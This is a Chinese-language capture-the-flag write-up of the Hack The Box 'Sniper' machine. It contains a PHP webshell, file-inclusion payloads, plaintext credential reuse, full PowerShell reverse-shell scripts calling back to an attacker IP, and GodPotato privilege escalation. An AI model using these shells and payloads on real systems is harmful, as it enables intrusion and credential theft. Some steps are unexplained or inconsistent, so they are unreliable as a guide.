---
title: HTB-Sniper Writeup
date: 2026-10-08T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - Windows
  - SMB
  - 文件包含
  - PrintSpoofer
  - BurpSuite
---
## Nmap 扫描

对机器进行全端口扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ sudo nmap --min-rate 10000 -p- 10.129.229.6 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-30 03:42 -0400
Nmap scan report for 10.129.229.6
Host is up (0.11s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds
```

对存活的端口进行详细信息扫描，80 端口跑的是 IIS 10.0 加 PHP 7.3.1，同时开启了 SMB。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ sudo nmap -sT -sC -sV -O -p80,135,139,445 10.129.229.6 -oA Nmap/detail
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-30 03:44 -0400
Nmap scan report for 10.129.229.6
Host is up (0.11s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-09-30T14:43:45
|_  start_date: N/A
|_clock-skew: 6h59m02s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.94 seconds
```

## Web 渗透

浏览 80 端口，发现开放注册功能，注册一个用户试试看。

![](Pasted%20image%2020260930154900.png)

登录后没有更多发现。

![](Pasted%20image%2020260930154936.png)

继续浏览网站，发现参数 `lang` 后面跟着文件，很可能存在文件包含。

![](Pasted%20image%2020260930160547.png)

## LFI

尝试修改 `lang` 的参数，确认存在文件包含。

![](Pasted%20image%2020261008102630.png)

注册帐号可以获得 PHPSESSID。

```bash
GET /user/index.php HTTP/1.1

Host: 10.129.229.6

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://10.129.229.6/user/login.php

Accept-Encoding: gzip, deflate, br

Cookie: PHPSESSID=mambsjsgcvp1828g803sba8bhp

Connection: keep-alive
```

PHP 在 Windows 上把会话写进 `C:\Windows\Temp\sess_<PHPSESSID>`，注册时的用户名会原样落进去。

注册借口会把 `$、(、[、_、;` 这类用户名删掉，所以经典的 webshell 存不进去，只能改用反引号把命令夹在用户名里。

注册一个恶意用户名，拿到 PHPSESSID 可以尝试包含获得代码执行。

![](Pasted%20image%2020261008111218.png)

注册拿到 PHPSESSID。

```bash
GET /user/index.php HTTP/1.1

Host: 10.129.229.6

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://10.129.229.6/user/login.php

Accept-Encoding: gzip, deflate, br

Cookie: PHPSESSID=8k77ioeaq891vo4kkovf4n8ba3

Connection: keep-alive


```

尝试进行包含，成功了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s 'http://10.129.229.6/blog/?lang=/Windows/Temp/sess_8k77ioeaq891vo4kkovf4n8ba3'
....
....
</html>
username|s:37:"z3";</body>
</html>
```

成功执行 `whoami` 拿到结果，证明了代码执行的可行性。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s 'http://10.129.229.6/blog/?lang=/Windows/Temp/o'
....
....
</html>
nt authority\iusr
</body>
</html>
```

写一个一句话木马。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ printf '%s' '<?php system($_GET["cmd"]); ?>' > shell.php
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ cat shell.php
<?php system($_GET["cmd"]); ?>                                                                                                                                          
```

起一个允许匿名访问的共享。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ impacket-smbserver -smb2support share /home/kali/Work/Kali/Sniper 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
```

执行命令 `cd` 可以获得当前的工作目录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&cmd=cd'
....
....
</html>
C:\inetpub\wwwroot\blog
</body>
</html>
```

执行 `dir` 查看当前目录下是否存在有价值的文件，结果是没有。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s -G 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php' --data-urlencode 'cmd=dir C:\inetpub\wwwroot'
....
....
</html>
 Volume in drive C has no label.
 Volume Serial Number is AE98-73A8

 Directory of C:\inetpub\wwwroot

04/11/2019  10:51 AM    <DIR>          .
04/11/2019  10:51 AM    <DIR>          ..
04/11/2019  05:23 AM    <DIR>          blog
04/11/2019  05:23 AM    <DIR>          css
04/11/2019  05:23 AM    <DIR>          images
04/11/2019  05:22 PM             2,635 index.php
04/11/2019  05:23 AM    <DIR>          js
04/11/2019  05:23 AM    <DIR>          scss
10/01/2019  08:44 AM    <DIR>          user
               1 File(s)          2,635 bytes
               8 Dir(s)   2,419,822,592 bytes free
</body>
</html>
```

继续枚举其他文件加，发现 `db.php`，很可能是数据库的连接文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s -G 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php' --data-urlencode 'cmd=dir C:\inetpub\wwwroot\user'
....
....
 Directory of C:\inetpub\wwwroot\user

10/01/2019  08:44 AM    <DIR>          .
10/01/2019  08:44 AM    <DIR>          ..
04/11/2019  05:15 PM               108 auth.php
04/11/2019  05:52 AM    <DIR>          css
04/11/2019  10:51 AM               337 db.php
04/11/2019  05:23 AM    <DIR>          fonts
04/11/2019  05:23 AM    <DIR>          images
04/11/2019  06:18 AM             4,639 index.php
04/11/2019  05:23 AM    <DIR>          js
04/11/2019  06:10 AM             6,463 login.php
04/08/2019  11:04 PM               148 logout.php
10/01/2019  08:42 AM             7,192 registration.php
08/14/2019  10:35 PM             7,004 registration_old123123123847.php
04/11/2019  05:23 AM    <DIR>          vendor
               7 File(s)         25,891 bytes
               7 Dir(s)   2,419,822,592 bytes free
</body>
</html>
```

读取 `db.php`，发现凭据 `$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s -G 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php' --data-urlencode 'cmd=type C:\inetpub\wwwroot\user\db.php'
....
....
</html>
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
</body>
</html>
```

把连接串写成一个查询脚本。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ cat dump.php
<?php
$m = new mysqli("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
if ($m->connect_error) { die("conn fail: ".$m->connect_error); }
echo "== tables ==\n";
$r = $m->query("show tables");
while ($row = $r->fetch_row()) { echo $row[0]."\n"; }
echo "== users ==\n";
$r = $m->query("select * from users");
if ($r) { while ($row = $r->fetch_assoc()) { print_r($row); } }
else { echo "query err: ".$m->error."\n"; }
```

执行这个脚本得到 `superuser` 的 md5 密码，但是爆破出来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/dump.php'
....
....
</html>
== tables ==
users
== users ==
Array
(
    [id] => 1
    [username] => superuser
    [email] => admin@sniper.co
    [password] => 6e573c8b25e9168e0c61895d821a3d57
    [trn_date] => 2019-04-11 22:45:36
)
Array
(
    [id] => 8
    [username] => enil
    [email] => enil@enil.com
    [password] => e41555b54d0dd8788d9b001f91972e40
    [trn_date] => 2026-10-08 02:13:18
)
Array
....
.....
</body>
</html>
```

尝试一下 chris 的密码有没有复用 `36mEAhz/B8xQ~2VM`，真的复用了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ nxc smb 10.129.229.6 -u chris -p '36mEAhz/B8xQ~2VM'
SMB         10.129.229.6    445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:None)
SMB         10.129.229.6    445    SNIPER           [+] Sniper\chris:36mEAhz/B8xQ~2VM
```

## SMB 探索

列出 chris 下的共享文件，只有 `IPC$` 可读。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ nxc smb 10.129.229.6 -u chris -p '36mEAhz/B8xQ~2VM' --shares
SMB         10.129.229.6    445    SNIPER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:None)
SMB         10.129.229.6    445    SNIPER           [+] Sniper\chris:36mEAhz/B8xQ~2VM
SMB         10.129.229.6    445    SNIPER           [*] Enumerated shares
SMB         10.129.229.6    445    SNIPER           Share           Permissions     Remark
SMB         10.129.229.6    445    SNIPER           -----           -----------     ------
SMB         10.129.229.6    445    SNIPER           ADMIN$                          Remote Admin
SMB         10.129.229.6    445    SNIPER           C$                              Default share
SMB         10.129.229.6    445    SNIPER           IPC$            READ            Remote IPC
```

写一个连接脚本。

解释一下：
- 新建一个 .NET 的 `TcpClient` 对象，构造时直接连接 kali。
- `$c.GetStream()` 拿到这条连接的 `NetworkStream`，后面的读写都走它。
- 0..65535 表示生成 65536 个数 ，`%{0}` 是 `ForEach-Object` 的别名，把每个都映射成 0，得到一个长度 65536，全是 0 的数组，也就是接收缓冲区。

这段 PowerShell 不落地任何工具，自己开一条 TCP 连回 Kali，把收到的每一行当命令执行，再把输出和提示符一起发回来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ cat rev.ps1
$c = New-Object Net.Sockets.TcpClient("10.10.16.151",4444)
$s = $c.GetStream(); [byte[]]$b = 0..65535 | %{0}
while (($i = $s.Read($b,0,$b.Length)) -ne 0) {
  $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $r = (iex $d 2>&1 | Out-String)
  $sb = ([text.encoding]::ASCII).GetBytes($r + "PS> ")
  $s.Write($sb,0,$sb.Length); $s.Flush()
}
```

执行这个脚本得到 iusr 的交互 bash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s -G 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php' --data-urlencode 'cmd=powershell -NoProfile -ExecutionPolicy Bypass -File \\10.10.16.151\share\rev.ps1'

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ sudo rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.229.6] 49904
PS> whoami
nt authority\iusr

```

## 提权至 chris

写一个提权到 chris 的脚本。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ cat rev-c.ps1
$c = New-Object Net.Sockets.TcpClient("10.10.16.151",4445)
$s = $c.GetStream(); [byte[]]$b = 0..65535 | %{0}
while (($i = $s.Read($b,0,$b.Length)) -ne 0) {
  $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $r = (iex $d 2>&1 | Out-String)
  $sb = ([text.encoding]::ASCII).GetBytes($r + "PS> ")
  $s.Write($sb,0,$sb.Length); $s.Flush()
}
```

在 iusr 的环境中执行这些命令，解释一下：
- 将明文密码转换为 SecureString，其中 `AsPlainText` 表示给的输入是明文，`Force` 表示跳过安全提示。
- 用用户名和 SecureString 组装一个 PSCredential，这是 Powershell 各 cmdlet 认的凭据包。
- 在指定凭据下执行一段代码，`ComputerName` 指定为 `localhost`，用 chris 的身份去验证，`ScriptBlock` 后面跟上要跑的内容。

```bash
PS> $pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential('SNIPER\chris', $pass)
PS> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { powershell -NoProfile -ExecutionPolicy Bypass -File \\10.10.16.151\share\rev-c.ps1 }
```

kali 起一个监听，拿到 chris 的 bash 环境。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ sudo rlwrap -cAr nc -lvnp 4445
[sudo] password for kali: 
listening on [any] 4445 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.229.6] 49909
whoami
sniper\chris
PS> 

```

枚举 C 盘下的目录，发现一个 `Docs` 文件夹。

```bash
PS> dir


    Directory: C:\


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
d-----        10/1/2019   1:04 PM                Docs                                              
d-----         4/9/2019   7:07 AM                inetpub                                           
d-----        4/11/2019   6:44 AM                Microsoft                                         
d-----        9/15/2018  12:19 AM                PerfLogs                                          
d-r---        4/29/2022   1:18 PM                Program Files                                     
d-----        8/14/2019  10:38 PM                Program Files (x86)                               
d-r---        4/11/2019   7:04 AM                Users                                             
d-----        4/29/2022   1:19 PM                Windows  
```

枚举发现一个 txt 文件和一个 pdf。

```bash
PS> dir


    Directory: C:\Docs


Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
-a----        4/11/2019   9:31 AM            285 note.txt                                          
-a----        4/11/2019   9:17 AM         552607 php for dummies-trial.pdf                         

```

```bash
PS> type note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

```

## 提权至 administrator

前面 iusr 如果执行 `whoami /priv` 会发现可以进行 Potato 提权。

下载 `GodPotato`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -sL -o GodPotato-NET4.exe https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ ls -liah GodPotato-NET4.exe
3552944 -rw-r--r-- 1 kali root 56K Oct  8 03:09 GodPotato-NET4.exe
```

复制到 iusr。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s -G 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php' \
  --data-urlencode 'cmd=copy \\10.10.16.151\share\GodPotato-NET4.exe C:\Windows\Temp\gp.exe'
....
....
</html>
        1 file(s) copied.
</body>
</html>
```

制作一个脚本，反向连接 4446 端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ cat rev4446.ps1
$c = New-Object Net.Sockets.TcpClient("10.10.16.151",4446)
$s = $c.GetStream(); [byte[]]$b = 0..65535 | %{0}
while (($i = $s.Read($b,0,$b.Length)) -ne 0) {
  $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $r = (iex $d 2>&1 | Out-String)
  $sb = ([text.encoding]::ASCII).GetBytes($r + "PS> ")
  $s.Write($sb,0,$sb.Length); $s.Flush()
}
```

制作一个 bat 脚本。
- `@echo off` 关掉回显
- -NoProfile 不加载用户/系统的配置文件
- -ExcutionPolicy Bypass 本地进程绕过执行策略

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ cat sysrev.bat
@echo off
powershell -NoProfile -ExecutionPolicy Bypass -File \\10.10.16.151\share\rev4446.ps1
```

复制文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s -G 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php' \
  --data-urlencode 'cmd=copy \\10.10.16.151\share\sysrev.bat C:\Windows\Temp\sysrev.bat'
....
....
</html>
        1 file(s) copied.
</body>
</html>
```

执行。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]
└─$ curl -s -G 'http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php' \
  --data-urlencode 'cmd=C:\Windows\Temp\gp.exe -cmd C:\Windows\Temp\sysrev.bat'
<html>
<body>
<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Services blog</title>



      <link rel="stylesheet" href="/blog/css/style.css">


</head>

<body>


<div id="main">
  <div class="container">
    <nav>
      <div class="nav-fostrap">
        <ul>
          <li><a href="/">Home</a></li>
          <li><a href="javascript:void(0)" >Language<span class="arrow-down"></span></a>
            <ul class="dropdown">
              <li><a href="/blog?lang=blog-en.php">English</a></li>
	      <li><a href="/blog?lang=blog-es.php">Spanish</a></li>
              <li><a href="/blog?lang=blog-fr.php">French</a></li>
            </ul>
          </li>
          <li><a href="javascript:void(0)" >Download<span class="arrow-down"></span></a>
            <ul class="dropdown">
              <li><a href="">Tools</a></li>
              <li><a href="">Backlink</a></li>
            </ul>
          </li>
        </ul>
      </div>
      <div class="nav-bg-fostrap">
        <div class="navbar-fostrap"> <span></span> <span></span> <span></span> </div>
        <a href="" class="title-mobile">Fostrap</a>
      </div>
    </nav>
</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
<script>



    <script  src="js/index.js"></script>




</body>

</html>
[*] CombaseModule: 0x140714463854592
[*] DispatchTable: 0x140714466163904
[*] UseProtseqFunction: 0x140714465544128
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\1319c654-c7ea-4730-819d-10a84e398972\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001802-051c-ffff-74ba-46bb9191aafa
[*] DCOM obj OXID: 0xb692fb726559181
[*] DCOM obj OID: 0xf5702704ae5034f8
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 856 Token:0x804  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1876
</body>
</html>
```

得到 administrater。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sniper]                                                                                                                                                
└─$ sudo rlwrap -cAr nc -lvnp 4446                                                                                                                                                  
[sudo] password for kali:                                                                                                                                                           
listening on [any] 4446 ...                                                                                                                                                         
connect to [10.10.16.151] from (UNKNOWN) [10.129.229.6] 49939                                                                                                                       
Microsoft Windows [Version 10.0.17763.678]                                                                                                                                          
(c) 2018 Microsoft Corporation. All rights reserved. 
```
